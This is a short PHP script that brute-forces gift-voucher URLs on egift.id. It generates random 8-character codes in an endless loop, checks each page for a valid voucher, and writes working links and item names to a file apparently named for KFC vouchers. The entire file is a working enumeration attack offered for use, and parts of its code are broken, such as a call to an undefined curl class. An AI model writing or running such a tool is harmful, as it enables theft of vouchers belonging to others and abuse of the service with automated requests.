<?php
// @RiyanCoday //
date_default_timezone_set("Asia/Jakarta");
error_reporting(0);
function getCurl($data) {
		
            // echo "<pre>";
            // print_r($data);
            // echo "</pre>";
            $curl = curl_init();
    
            curl_setopt_array($curl, array(
                CURLOPT_URL => $data['url'],
                CURLOPT_RETURNTRANSFER => true,
                // CURLOPT_SSL_VERIFYHOST => 0,
                // CURLOPT_SSL_VERIFYPEER => 0,
                CURLOPT_ENCODING => "",
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 30,
                CURLOPT_HTTPHEADER => $data['header'],
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => $data['method'],
                CURLOPT_POSTFIELDS => $data['parser'],
            ));
    
            
            $response = curl_exec($curl);
            $err = curl_error($curl);
        
            curl_close($curl);
    
            if ($err) return $err;
            else return $response;
        }
function x($length)
{
    $data = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $string = '';
    for($i = 0; $i < $length; $i++) {
        $pos = rand(0, strlen($data)-1);
        $string .= $data{$pos};
    }
    return $string;
}
$curl = new curl();
$curl->ssl(0, 2);	
$i=0;
while (true) {	
$tod = x(8);
$page = $curl->get('http://egift.id/'.$tod.'');
	if (stripos($page, 'h1 style="top: 0;">')) {
				preg_match_all('/<span id="p_item_name">(.*?)<\/span>/', $page, $nom);
		echo ''.$i.'.LIVE => http://egift.id/'.$tod.' | '.$nom[1][0].'';
		$data =  "http://egift.id/".$tod." | '.$nom[1][0].' \r\n";
		$fh = fopen("cdy-kfc.txt", "a");
		fwrite($fh, $data);
		fclose($fh);
									echo "\n";
	}else	if (stripos($page, '<h1>E-VOUCHER</h1>')) {

		echo ''.$i.'.DIE => http://egift.id/'.$tod.'';
									echo "\n";
	}else{
		echo ' ERROR '.$tod;
									echo "\n";
	}
		flush();
		ob_flush();
	$i++;
}
?>
